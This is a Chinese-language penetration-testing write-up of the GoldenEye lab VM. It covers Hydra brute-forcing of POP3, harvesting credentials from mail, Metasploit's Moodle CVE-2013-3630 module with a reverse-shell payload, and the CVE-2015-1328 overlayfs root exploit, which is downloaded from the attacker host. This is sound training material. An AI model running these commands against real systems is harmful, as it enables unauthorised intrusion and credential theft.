# GoldenEye 渗透实战 Writeup

> **目标：** GoldenEye 靶机
> **攻击路径：** 信息收集 → 弱口令爆破 → 横向移动 → 隐写取密 → Web 漏洞利用 → 本地提权
> **最终权限：** root

---

## 一、信息收集

### 1.1 主机发现

先确认攻击机 IP，再使用 `netdiscover` 扫描同网段存活主机，结合 MAC 地址（VMware 虚拟机网卡特征）定位目标靶机。

```bash
netdiscover -r 192.168.0.0/24
```

### 1.2 端口扫描

```bash
masscan -p 0-65535 --rate=1000 192.168.0.6
nmap -sS -sV -T5 -A 192.168.0.6
```

**结果：**

| 端口 | 服务 | 说明 |
|---|---|---|
| 25/tcp | smtp | Postfix smtpd |
| 80/tcp | http | Apache httpd 2.4.7 (Ubuntu) |

访问 80 端口，页面标题为 **GoldenEye Primary Admin Server**。

---

## 二、Web 信息收集与初始凭据

### 2.1 页面提示

首页显示一段文本提示：

> Navigate to `/sev/home/` to login

访问该路径发现需要登录，于是回到首页查看源代码。

### 2.2 源码审计

在 `view-source` 中发现注释信息，提示了两个用户名，以及一段被编码的密码：

```
<!--Boris, make sure you update your default password!-->
<!--My sources say MI6 maybe planning to infiltrate-->
<!--Be on the lookout for any suspicious network traffic-->
<!--I encoded you p@ssword below-->
<!--InvincibleHack3r-->
<!--BTW Natalya says she can break your codes-->
```

- 获得用户名：`boris`、`natalya`
- 解码 `InvincibleHack3r` 得到 HTML 页面密码

### 2.3 登录并二次信息收集

用 `boris / InvincibleHack3r` 登录成功后，页面提示：

> 由于该系统的敏感性，我们已将 POP3 服务配置为在**非常高的非默认端口**下运行

同时提示可通过 `/terminal.js` 查看。

---

## 三、端口再扫描与凭据爆破

### 3.1 全端口扫描

```bash
nmap -p- 192.168.0.6
```

**新发现：**

| 端口 | 服务 |
|---|---|
| 55006/tcp | ssl/pop3 (Dovecot pop3d) |
| 55007/tcp | pop3 (Dovecot pop3d) |

### 3.2 Hydra 爆破 POP3

根据页面提示「默认密码未更改」，构造用户名字典后爆破：

```bash
echo -e "natalya\nboris\nBoris\nNatalya" > key.txt
hydra -L key.txt -P /usr/share/wordlists/fasttrack.txt 192.168.0.6 -s 55007 pop3 -vV
```

**爆破结果：**

| 用户 | 密码 |
|---|---|
| `natalya` | bird |
| `boris` | secret1A |

---

## 四、邮件系统横向移动

### 4.1 连接 POP3 读取邮件

```bash
nc 192.168.0.6 55007
user boris
pass secret1A
list
retr 1
```

### 4.2 关键情报

**boris 的邮件：**

- 第 3 封来自 `alec@janus.boss`，提到 **GoldenEye 的访问码**作为附件发送，并被要求存放在服务器根目录的隐藏文件中

**natalya 的邮件：**

- 第 2 封来自 root，包含**新用户凭据**和**内部域名**：

| 项目 | 值 |
|---|---|
| 用户名 | `xenia` |
| 密码 | `RCP90rulez!` |
| 域名 | `severnaya-station.com` |
| 路径 | `/gnocertdir` |

邮件还提示：由于是远程办公，需要在 `/etc/hosts` 中手动配置域名解析。

### 4.3 伪造域名解析

```bash
vi /etc/hosts
# 添加：192.168.0.6  severnaya-station.com
```

### 4.4 继续爆破 doak 用户

情报显示还存在 `doak` 用户，追加到字典后再次爆破：

```bash
echo -e "doak\nDoak" >> key.txt
hydra -L key.txt -P /usr/share/wordlists/fasttrack.txt 192.168.0.6 -s 55007 pop3
```

**结果：** `doak / goat`

登录 doak 邮箱，从邮件中获得**又一组凭据**：

| 用户名 | 密码 |
|---|---|
| `dr_doak` | `4England!` |

---

## 五、进入 CMS 并提取管理员密码

### 5.1 登录 Moodle

访问 `http://severnaya-station.com/gnocertdir`，识别为 **Moodle 2.2.3** CMS 系统。

用 `dr_doak / 4England!` 登录后，在 `Home → My home` 下发现 `s3cret.txt`：

> 我通过明文流量抓到了这个应用的管理员凭据……**关键内容在这里：`/dir007key/for-007.jpg`**

### 5.2 图片隐写取密

访问该图片并下载到本地：

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
```

查看图片属性 / 使用 base64 提取隐藏信息，得到：

```
eFdpbnRlcjE5OTV4IQ==
```

Base64 解码：

```
xWinter1995x!
```

**获得管理员凭据：** `admin / xWinter1995x!`

---

## 六、漏洞利用获取 Shell

### 6.1 确定漏洞

Moodle 2.2.3 存在远程代码执行漏洞 **CVE-2013-3630**，也可使用 MSF 的 `moodle_spelling_binary_rce` 模块。

### 6.2 前置配置

由于目标使用 PSpellShell，需先用 admin 账户登录后台修改配置：

```
Home → Site administration → Plugins → Text editors → TinyMCE HTML editor
→ 修改 PSpellShell 路径 → Save
```

### 6.3 MSF 利用

```bash
msfconsole
use exploit/multi/http/moodle_spelling_binary_rce
set rhost severnaya-station.com
set targeturi /gnocertdir
set username admin
set password xWinter1995x!
set payload cmd/unix/reverse
set lhost 192.168.0.7
run
```

### 6.4 Shell 交互升级

获得的 Shell 无法正常交互，使用 Python 升级为 TTY：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**当前权限：** `www-data`

---

## 七、本地提权

### 7.1 信息收集

```bash
uname -a
# Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64
```

内核版本 **3.13.0-32**，存在 overlayfs 本地提权漏洞 **CVE-2015-1328**。

### 7.2 上传并编译 EXP

```bash
searchsploit 37292
cp /usr/share/exploitdb/exploits/linux/local/37292.c .

# 目标机无 gcc，只有 cc，需修改源码
vim 37292.c
# 第 143 行：把 gcc 改为 cc

# 本地起 HTTP 服务
python3 -m http.server 80
```

目标机上：

```bash
cd /tmp
wget http://192.168.0.7:80/37292.c
cc -o exp 37292.c
chmod +x exp
./exp
id
```

### 7.3 拿到 flag

```bash
cat /root/.flag.txt
# 568628e0d993b1973adc718237da6e93
```

**提权成功，获得 root 权限。**

---

## 八、总结

| 阶段 | 关键手段 |
|---|---|
| 信息收集 | 源码注释泄露用户名；页面提示暴露非默认端口 |
| 凭据获取 | Hydra 爆破 POP3（弱口令 + 默认密码未改） |
| 横向移动 | 邮件系统作为情报源，逐层获取新凭据 |
| 二次入口 | hosts 伪造 + 图片隐写提取 Base64 密码 |
| 获取 Shell | CVE-2013-3630 Moodle RCE |
| 权限提升 | CVE-2015-1328 overlayfs 提权 |

### 核心启示

1. **源码注释是金矿** —— 开发者的「随手一写」往往是渗透的突破口
2. **邮件系统是横向移动的跳板** —— 真实场景中，内部沟通记录常包含凭据流转
3. **隐写术不只是 CTF 杂项** —— 真实渗透中同样存在
4. **提权前先看内核版本** —— `uname -a` 对照 EXP 库，比盲目尝试高效得多
